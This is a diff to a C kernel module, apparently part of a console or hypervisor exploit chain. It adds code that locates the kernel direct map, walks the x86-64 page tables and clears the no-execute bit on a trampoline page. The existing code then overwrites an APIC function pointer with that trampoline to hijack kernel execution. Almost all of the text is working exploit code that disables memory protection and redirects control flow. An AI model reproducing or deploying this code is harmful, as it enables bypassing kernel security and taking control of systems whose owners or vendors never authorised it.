@@ -101,6 +101,89 @@ static inline void write8(uint64_t addr, uint64_t val)
     *(volatile uint64_t*)addr = val;
 }
 
+static inline uint64_t read_cr3(void)
+{
+    uint64_t val;
+    __asm__ volatile("movq %%cr3, %0" : "=r"(val));
+    return val;
+}
+
+/*
+ * Clear NX bit on the page containing `vaddr`.
+ * Walks the 4-level page table using DMAP to access physical pages.
+ * Returns 1 on success, 0 on failure.
+ */
+static int clear_nx_on_page(uint64_t vaddr, uint64_t dmap_base)
+{
+    uint64_t cr3 = read_cr3();
+    uint64_t pml4_phys = cr3 & ~0xFFFULL;
+
+    /* Extract page table indices */
+    uint64_t pml4_idx = (vaddr >> 39) & 0x1FF;
+    uint64_t pdpt_idx = (vaddr >> 30) & 0x1FF;
+    uint64_t pd_idx   = (vaddr >> 21) & 0x1FF;
+    uint64_t pt_idx   = (vaddr >> 12) & 0x1FF;
+
+    /* Walk PML4 */
+    uint64_t pml4e = read8(dmap_base + pml4_phys + pml4_idx * 8);
+    if (!(pml4e & 1)) return 0;  /* not present */
+
+    /* Walk PDPT */
+    uint64_t pdpt_phys = pml4e & 0x000FFFFFFFFFF000ULL;
+    uint64_t pdpte = read8(dmap_base + pdpt_phys + pdpt_idx * 8);
+    if (!(pdpte & 1)) return 0;
+    if (pdpte & (1ULL << 7)) {
+        /* 1GB page — clear NX (bit 63) */
+        uint64_t addr = dmap_base + pdpt_phys + pdpt_idx * 8;
+        write8(addr, pdpte & ~(1ULL << 63));
+        __asm__ volatile("invlpg (%0)" :: "r"(vaddr) : "memory");
+        return 1;
+    }
+
+    /* Walk PD */
+    uint64_t pd_phys = pdpte & 0x000FFFFFFFFFF000ULL;
+    uint64_t pde = read8(dmap_base + pd_phys + pd_idx * 8);
+    if (!(pde & 1)) return 0;
+    if (pde & (1ULL << 7)) {
+        /* 2MB page — clear NX */
+        uint64_t addr = dmap_base + pd_phys + pd_idx * 8;
+        write8(addr, pde & ~(1ULL << 63));
+        __asm__ volatile("invlpg (%0)" :: "r"(vaddr) : "memory");
+        return 1;
+    }
+
+    /* Walk PT */
+    uint64_t pt_phys = pde & 0x000FFFFFFFFFF000ULL;
+    uint64_t pte_addr = dmap_base + pt_phys + pt_idx * 8;
+    uint64_t pte = read8(pte_addr);
+    if (!(pte & 1)) return 0;
+
+    /* Clear NX (bit 63) */
+    write8(pte_addr, pte & ~(1ULL << 63));
+    __asm__ volatile("invlpg (%0)" :: "r"(vaddr) : "memory");
+    return 1;
+}
+
+/*
+ * Detect DMAP base by probing known candidates.
+ * Returns DMAP base or 0 on failure.
+ */
+static uint64_t detect_dmap_base(void)
+{
+    uint64_t cr3_phys = read_cr3() & ~0xFFFULL;
+    uint64_t candidates[] = {
+        0xFFFFF80000000000ULL,
+        0xFFFFD80000000000ULL,
+        0xFFFFE00000000000ULL,
+    };
+    for (int i = 0; i < 3; i++) {
+        uint64_t val = read8(candidates[i] + cr3_phys);
+        if (val & 1)  /* PML4 entry present bit */
+            return candidates[i];
+    }
+    return 0;
+}
+
 /*
  * Build the trampoline shellcode.
  *
@@ -358,10 +441,26 @@ int module_start(kproc_args* args)
     build_trampoline(tramp_buf, capture_buf, original_xapic);
     out[4] = trampoline_addr;
 
-    /* We need NX cleared on the trampoline page.
-     * The kdata page at kdata_base should already have NX cleared from
-     * previous sessions. But if not, we'd need kekcall 10.
-     * For now, assume NX is already cleared (it persists). */
+    /* Clear NX on the trampoline page so it's executable.
+     * Walk guest page tables via DMAP and clear bit 63 on the PTE. */
+    uint64_t dmap_base = detect_dmap_base();
+    out[8] = dmap_base;  /* report DMAP base for debugging */
+
+    if (dmap_base == 0) {
+        out32[1] = 0xFB;  /* error: can't find DMAP */
+        apic_table[2] = original_xapic;
+        out[40] = 0xdeadbeefcafe0010ULL;
+        return 0;
+    }
+
+    int nx_result = clear_nx_on_page(trampoline_addr, dmap_base);
+    out[9] = (uint64_t)nx_result;  /* 1=success, 0=failed */
+
+    if (!nx_result) {
+        out32[1] = 0xFA;  /* error: NX clear failed */
+        out[40] = 0xdeadbeefcafe0010ULL;
+        return 0;
+    }
 
     /* Install trampoline: overwrite apic_ops[2] */
     apic_table[2] = trampoline_addr;
